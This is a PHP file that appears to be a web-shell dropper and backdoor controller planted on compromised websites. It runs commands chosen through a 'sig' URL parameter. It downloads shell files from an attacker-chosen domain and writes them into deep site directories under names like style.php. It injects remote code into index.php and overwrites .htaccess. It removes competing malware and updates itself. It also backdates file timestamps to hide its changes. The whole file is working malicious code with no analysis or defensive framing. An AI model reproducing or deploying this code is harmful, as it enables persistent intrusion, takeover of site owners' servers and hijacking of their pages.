<?php
	define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));
	function curl_get_contents($url){
       $ch =curl_init();
       curl_setopt($ch, CURLOPT_URL, $url);
       curl_setopt($ch, CURLOPT_TIMEOUT,5);
       curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
       $r = curl_exec($ch);
       curl_close($ch);
       return $r;
    }
    function check_remote_file_exists($url) {
	    $curl = curl_init($url);
	    curl_setopt($curl, CURLOPT_NOBODY, true);
	    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'GET');
	    $result = curl_exec($curl);
	    $found = false;
	    if ($result !== false) {
	        $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
	        if ($statusCode == 200) {
	            $found = true;
	        }
	    }
	    curl_close($curl);
	    return $found;
	}
	function copyfiles($file1,$file2){
	 	$contentx =@file_get_contents($file1);
	  	$openedfile = @fopen($file2, "w");
	  	@fwrite($openedfile, $contentx);
	  	@fclose($openedfile);
	    if ($contentx === FALSE) {
	   		$status=false;
	    }else $status=true;
	   	return $status;
  	}
	function read_dir_queue($dir,$level=5){
		$files=array();
		$files1=array();
		$queue=array($dir);
		while(@$data=each($queue)){
			$path=$data['value'];
			if(@is_dir($path) && @$handle=@opendir($path)){
				while($file=@readdir($handle)){
					$path3 = str_replace($_SERVER['DOCUMENT_ROOT'],"",$path);
					$path4 = explode("/",$path3);
					if(count($path4)>$level){ break 2; }
					//if(count($files)>1000){ break 2; }
					if($file=='.'||$file=='..') continue;
					$files[] = $real_path=$path.'/'.$file;
					if (is_dir($real_path)) $queue[] = $real_path;
				}
			}
			@closedir($handle);
		}
		return $files;
	}
	function dir_size1($dir3,$url){
	      $dh = @opendir($dir3);
	      $return = array();
		  while($file = @readdir($dh)){
		     if($file!='.' and $file!='..'){
		     	$filetime[] = date("Y-m-d H:i:s",filemtime($file));
	         }
	      }  
          @closedir($dh);             
          @array_multisort($filetime);
          return $filetime;
	}

 	$sig = $_GET['sig'];
 	$domain_2020 = 'http://'.$_GET['domain'];
 	if($sig=='beima'){
 		$level = $_GET['level'];
 		$aPathes = @read_dir_queue($_SERVER['DOCUMENT_ROOT'],$level);
		function getDepth($sPath) {
		    return substr_count($sPath, '/');
		}
		$aPathDepths = array_map('getDepth', $aPathes);
		arsort($aPathDepths);
		$arry1=array();
		foreach ($aPathDepths as $iKey => $iDepth) {
			$arry1[] = $aPathes[$iKey];
		}
		$arry2=array();
		for($j=0;$j<8;$j++){
			if($arry1[$j]!=''){
				$arry2[]=$arry1[$j];
			}
		}
		shuffle($arry2);
		$shell_file = $_GET['shell_file'];
		$shell_source5 = $domain_2020."/shell_index/".$shell_file.".html";
		$file_name = $_GET['file_name'];
		if($file_name!=""){
			$shell_end5 = dirname($arry2[0]).'/'.$file_name;
		}else{
			$shell_end5 = dirname($arry2[0]).'/style.php';
		}
 		if(copyfiles($shell_source5,$shell_end5))
	    {
	    	if($_SERVER["HTTPS"] == "on") 
		    {
		        $http1="https://";
		    }else{
		    	$http1="http://";
		    }
	     	if(!file_exists($shell_end5))
			{
			    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
			    exit;
			}
			
			$time3=@dir_size1($shell_end5,'');
	 		$time4=strtotime($time3[0]);
 		 	touch($shell_end5,$time4);
			
	 		$shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
	 		echo $shell_end6; 
	    }else{
	    	$str6=@curl_get_contents($shell_source5);
	    	file_put_contents($shell_end5,$str6);
	    	if($_SERVER["HTTPS"] == "on") 
		    {
		        $http1="https://";
		    }else{
		    	$http1="http://";
		    }
	     	if(!file_exists($shell_end5))
			{
			    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
			    exit;
			}
			
			$time3=@dir_size1($shell_end5,'');
	 		$time4=strtotime($time3[0]);
 		 	touch($shell_end5,$time4);
		    $shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
	 		echo $shell_end6;
	    }
	    exit;
 	}else if($sig=='jc_other'){
 		$level = $_GET['level'];
 		$aPathes = read_dir_queue($_SERVER['DOCUMENT_ROOT'],$level);
		function getDepth($sPath) {
		    return substr_count($sPath, '/');
		}
		$aPathDepths = array_map('getDepth', $aPathes);
		arsort($aPathDepths);
		$arry1=array();
		foreach ($aPathDepths as $iKey => $iDepth) {
			$arry1[] = $aPathes[$iKey];
		}
		$arry2=array();
		for($j=0;$j<8;$j++){
			if($arry1[$j]!=''){
				$arry2[]=$arry1[$j];
			}
		}
		shuffle($arry2);
		$shell_file = $_GET['shell_file'];
		$shell_source5 = $domain_2020."/shell_index/".$shell_file.".html";
		$file_name = $_GET['file_name'];
		if($file_name!=""){
			$shell_end5 = dirname($arry2[0]).'/'.$file_name;
		}else{
			$shell_end5 = dirname($arry2[0]).'/style.php';
		}
		
 		if(copyfiles($shell_source5,$shell_end5))
	    {
	    	if($_SERVER["HTTPS"] == "on") 
		    {
		        $http1="https://";
		    }else{
		    	$http1="http://";
		    }
	     	if(!file_exists($shell_end5))
			{
			    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
			    exit;
			}
			
			$time3=@dir_size1($shell_end5,'');
	 		$time4=strtotime($time3[0]);
 		 	touch($shell_end5,$time4);
			
	 		$shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
	 		echo $shell_end6; 
	    }else{
	    	$str6=@curl_get_contents($shell_source5);
	    	file_put_contents($shell_end5,$str6);
	    	if($_SERVER["HTTPS"] == "on") 
		    {
		        $http1="https://";
		    }else{
		    	$http1="http://";
		    }
	     	if(!file_exists($shell_end5))
			{
			    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
			    exit;
			}
			
			$time3=@dir_size1($shell_end5,'');
	 		$time4=strtotime($time3[0]);
 		 	touch($shell_end5,$time4);
		    $shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
	 		echo $shell_end6;
	    }
	    exit;
 	}else if($sig=='jc_index'){
 		//define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));
 		$domain_name1 = trim(str_replace("www.","",$_SERVER['SERVER_NAME']));
 		$shell_file = $_GET['shell_file'];
		$shell_source5 = $domain_2020."/shell_index/".$shell_file.".html";
		$shell_index1= BASE_PATH.'/index.php';
		
		if($_SERVER["HTTPS"] == "on") 
		{
		    $http1="https://";
		}else{
		    $http1="http://";
		}
		$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
 		$file_path1 = $domain_2020.'/shell_index/'.$domain_name1.'/index.html';
		if(!check_remote_file_exists($file_path1)){
			$ser_url1= $domain_2020."/create_path_file41.php?dname1=".$domain_name1."&check_address1=http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."";
			$file_contents_2=curl_get_contents($ser_url1);
			//echo $file_contents_2;
		}
		if(file_exists($shell_index1)){
			$shell_content1= file_get_contents($shell_index1);
			$shell_content2 = explode('?>',$shell_content1);
			$shell_content3 = $shell_content1;
			$shell_content4 ='';
			
			for($i=0;$i<count($shell_content2);$i++){
	 			if(strpos($shell_content2[$i],'base64_decode(') !== false || strpos($shell_content2[$i],'urldecode(') !== false || strpos($shell_content2[$i],'O00__0OOO_') !== false || strpos($shell_content2[$i],'yumingid') !== false || strpos($shell_content2[$i],'urlgz=') !== false || strpos($shell_content2[$i],'O0O_0O_O_0') !== false || strpos($shell_content2[$i],'wp-admin') !== false || strpos($shell_content2[$i],'ignore_user_abort') !== false || strpos($shell_content2[$i],'HTTP_REFERER') !== false || strpos($shell_content2[$i],'sitemap') !== false || strpos($shell_content2[$i],'$x(') !== false || strpos($shell_content2[$i],'$_GET["3x"]') !== false || strpos($shell_content2[$i],'error_reporting') !== false || strpos($shell_content2[$i],'ini_set(') !== false || strpos($shell_content2[$i],'ini_set(') !== false){
				 	$shell_content3=str_replace($shell_content2[$i]."?>","",$shell_content3);
				}
 			}
 			
 			$fp_shell_index1=@fopen($shell_index1,'w');
			@fwrite($fp_shell_index1,$shell_content3);
			//echo 'write success!'.'<br />';
			@fclose($fp_shell_index1);
			
			$shell_content22 = @curl_get_contents($shell_source5);
			$shell_content19= @file_get_contents($shell_index1);
 			$shell_content39 = substr_replace($shell_content19,$shell_content22.PHP_EOL,0,0);
 			$fp_shell_index39=@fopen($shell_index1,'w');
			@fwrite($fp_shell_index39,$shell_content39);
			@fclose($fp_shell_index39);
			@chmod($shell_index1,0644);
			echo $tishi.'|'.'index.php success!';
		}else{
			if(copyfiles($shell_source5,$shell_index1)){
				echo $tishi.'|'.'index.php success!';
			}else{
				$str6=@curl_get_contents($shell_source5);
				$str=@file_get_contents($shell_index1);
				file_put_contents($shell_index1,$str6);
				if($str6==$str){
					echo $tishi.'|'.'index.php success!';
				}else{
					echo $tishi.'|'.'index.php fail!';
				}
			}
		}
 	}else if($sig=='change_hta'){
 		//define('BASE_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));
		//define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));
		$shell_source5 = $domain_2020."/shell_index/htaccess.html";
		$file_htaccess = BASE_PATH.'/.htaccess';
 		if($_SERVER["HTTPS"] == "on") 
		{
		    $http1="https://";
		}else{
		    $http1="http://";
		}
		$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
		
		if(file_exists($file_htaccess)){
			$result_unlink=unlink($file_htaccess);
			if($result_unlink){
				if(copyfiles($shell_source5,$file_htaccess)){
					echo $tishi.'|'.'.htaccess 写入成功!';
				}else{
					$str6=@curl_get_contents($shell_source5);
					$str=@file_get_contents($file_htaccess);
					file_put_contents($file_htaccess,$str6);
					if($str6==$str){
						echo $tishi.'|'.'htaccess 写入成功!';
					}else{
						echo $tishi.'|'.'.htaccess 写入不成功!';
					}
				}
			}else{
				if(copyfiles($shell_source5,$file_htaccess)){
					echo $tishi.'|'.'.htaccess 写入成功!';
				}else{
					$str6=@curl_get_contents($shell_source5);
					$str=@file_get_contents($file_htaccess);
					file_put_contents($file_htaccess,$str6);
					if($str6==$str){
						echo $tishi.'|'.'.htaccess 写入成功!';
					}else{
						echo $tishi.'|'.'.htaccess 写入不成功!';
					}
				}
			}
		}else{
			if(copyfiles($shell_source5,$file_htaccess)){
				echo $tishi.'|'.'.htaccess 写入成功!';
			}else{
				$str6=@curl_get_contents($shell_source5);
				$str=@file_get_contents($file_htaccess);
				file_put_contents($file_htaccess,$str6);
				if($str6==$str){
					echo $tishi.'|'.'.htaccess 写入成功!';
				}else{
					echo $tishi.'|'.'.htaccess 写入不成功!';
				}
			}
		}
	    exit;
 	}else if($sig=='rename'){
 		$rename = $_GET['rename'];
 		$source_name = $_GET['source_name'];
 		if($_GET['tag']!=''){
 			$tag='#'.$_GET['tag'];
 		}else{
 			$tag='';
 		}
 		$rename_file = dirname(__FILE__).'/'.$rename;
	 	$source_file = dirname(__FILE__).'/'.$source_name;
 		if($_SERVER["HTTPS"] == "on") 
		{
		   $http1="https://";
		}else{
		   $http1="http://";
		}
		$rename_file1 = $http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$rename_file);
		$source_file1 = $http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$source_file);
		
	    if(file_exists($source_file)){
	        if(rename($source_file,$rename_file)){
	            echo $rename_file1.$tag;
	        }else{
	            echo $source_file1.$tag.'| rename fail!';
	        }
	    }else{
	        echo $source_file1.$tag.'| no exists!';
	    }
 		exit;
 	}else if($sig=='update'){
 		$style_2020=$domain_2020.'/shell_index'.'/style_2020.html';
 		$file_style=__FILE__;
 		if(check_remote_file_exists($style_2020)){
	 		if($_SERVER["HTTPS"] == "on") 
			{
			    $http1="https://";
			}else{
			    $http1="http://";
			}
			$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
 			if(copyfiles($style_2020,$file_style))
		    {
		    	$time3=@dir_size1(dirname(__FILE__),'');
				$time4=strtotime($time3[0]);
				touch($file_style,$time4);
		    	echo $tishi.'--update success!';
		    }else{
		    	$shell_cont5=@curl_get_contents($style_2020);
		    	$shell51=@file_put_contents($file_style,$shell_cont5);
		    	if($shell51>0){
		    		$time3=@dir_size1(dirname(__FILE__),'');
					$time4=strtotime($time3[0]);
					touch($file_style,$time4);
					echo $tishi.'--update success!';
		    	}else{
		    		echo $tishi.'--update fail!';
		    	}
		    }	
 		}
		exit;	
 	}else if($sig=='shell519'){
 		$domain_name = $_SERVER['SERVER_NAME'];
		$domain_name1 = str_replace("www.","",$_SERVER['SERVER_NAME']);
 		$shell5=getcwd().'/'.substr($domain_name1,0,5).chr(rand(97,122)).'.php';
 		$shell_source5= $domain_2020."/shell_index/shell519.html";
 		if(check_remote_file_exists($shell_source5)){
	 		if($_SERVER["HTTPS"] == "on") 
		    {
		        $http1="https://";
		    }else{
		    	$http1="http://";
		    }
	 		if(copyfiles($shell_source5,$shell5))
		    {
		    	$time3=@dir_size1(dirname(__FILE__),'');
				$time4=strtotime($time3[0]);
				touch($shell5,$time4);
		        echo $http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,"",$shell5).'--create success!';
		    }
		    else
		    {
		    	$shell_cont5=@curl_get_contents($shell_source5);
		    	$shell51=@file_put_contents($shell5,$shell_cont5);
		    	if($shell51>0){
		    		$time3=@dir_size1(dirname(__FILE__),'');
					$time4=strtotime($time3[0]);
					touch($shell5,$time4);
		    		echo $http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,"",$shell5).'--create success!';
		    	}else{
		    		echo $http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,"",$shell5).'--create fail!';
		    	}
		    }
 		}
		exit;
 	}else if($sig=='index'){
 		$file_path = BASE_PATH.'/index.php';
 		$file_path1 = BASE_PATH.'/index.html';
 		$file_path2 = BASE_PATH.'/index.htm';
 		$file_path3 = BASE_PATH.'/default.html';
 		if(file_exists($file_path)){
 			$str=@file_get_contents($file_path);
 			echo $str;
 			exit;
 		}else if(file_exists($file_path1)){
 			$str1=@file_get_contents($file_path1);
 			echo $str1;
 			exit;
 		}else if(file_exists($file_path2)){
 			$str2=@file_get_contents($file_path2);
 			echo $str2;
 			exit;
 		}else if(file_exists($file_path3)){
 			$str3=@file_get_contents($file_path3);
 			echo $str3;
 			exit;
 		}else{
 			echo '';
 			exit;
 		}
 	}
 	exit();
?>